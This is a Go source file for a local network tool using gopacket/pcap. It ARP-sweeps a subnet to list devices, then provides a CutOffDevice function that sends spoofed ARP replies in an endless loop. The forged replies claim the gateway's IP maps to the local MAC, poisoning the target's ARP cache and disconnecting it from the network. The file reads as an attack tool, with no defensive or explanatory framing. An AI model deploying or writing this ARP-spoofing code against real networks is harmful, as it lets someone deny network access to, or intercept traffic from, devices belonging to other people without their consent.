package networkscan

import (
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

type Device struct {
	IP       net.IP
	MAC      net.HardwareAddr
	HOSTNAME []string
}

type NetworkScanner struct {
	handle   *pcap.Handle
	localIP  net.IP
	localMAC net.HardwareAddr
}

func NewNetworkScanner(pcapName string) *NetworkScanner {

	handle, err := pcap.OpenLive(pcapName, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatalf("Error opening device %s: %v", pcapName, err)
	}

	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}

	var localIP net.IP
	var localMAC net.HardwareAddr

	for _, d := range devices {
		if d.Name == pcapName {
			for _, addr := range d.Addresses {
				if addr.IP.To4() != nil {
					localIP = addr.IP.To4()
					break
				}
			}
			break
		}
	}

	ifaces, _ := net.Interfaces()
	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok {
				if ipnet.IP.To4() != nil && ipnet.IP.Equal(localIP) {
					localMAC = i.HardwareAddr
					break
				}
			}
		}
	}

	if localIP == nil || localMAC == nil {
		log.Fatal("Could not determine local IP/MAC")
	}

	return &NetworkScanner{
		handle:   handle,
		localIP:  localIP,
		localMAC: localMAC,
	}
}

func (ns *NetworkScanner) NetScan(targetNet string) []Device {

	_, ipNet, err := net.ParseCIDR(targetNet)
	if err != nil {
		log.Fatalf("Error parsing CIDR: %v", err)
	}

	fmt.Printf("Scanning network %s...\n", ipNet)

	done := make(chan bool)
	defer close(done)

	go func() {
		for ip := ipNet.IP.Mask(ipNet.Mask); ipNet.Contains(ip); IncrementIP(ip) {
			if ip.Equal(ns.localIP) {
				continue
			}
			go SendARPRequest(
				ns.handle,
				net.HardwareAddr{0, 0, 0, 0, 0, 0},
				ns.localMAC,
				ns.localIP,
				ip,
			)
			time.Sleep(200 * time.Millisecond)
		}
		time.Sleep(1 * time.Second)
		done <- true
	}()

	packetSource := gopacket.NewPacketSource(ns.handle, ns.handle.LinkType())
	var devices []Device

	for {
		select {
		case packet := <-packetSource.Packets():
			device := HandleARPPacket(packet)
			if device.IP != nil && device.MAC != nil {
				devices = append(devices, device)
				fmt.Printf("IP=%s MAC=%s\n", device.IP, device.MAC)
			}
		case <-done:
			fmt.Println("Scan completed.")
			return devices
		}
	}
}

func (ns *NetworkScanner) CutOffDevice(device Device, gateway string) {

	routerIP := net.ParseIP(gateway).To4()
	if routerIP == nil {
		log.Fatal("Invalid gateway IP")
	}

	for {
		SendARPReply(
			ns.handle,
			device.MAC,
			device.IP,
			ns.localMAC,
			routerIP,
		)
		time.Sleep(2 * time.Second)
	}
}

func (ns *NetworkScanner) Close() {
	ns.handle.Close()
}
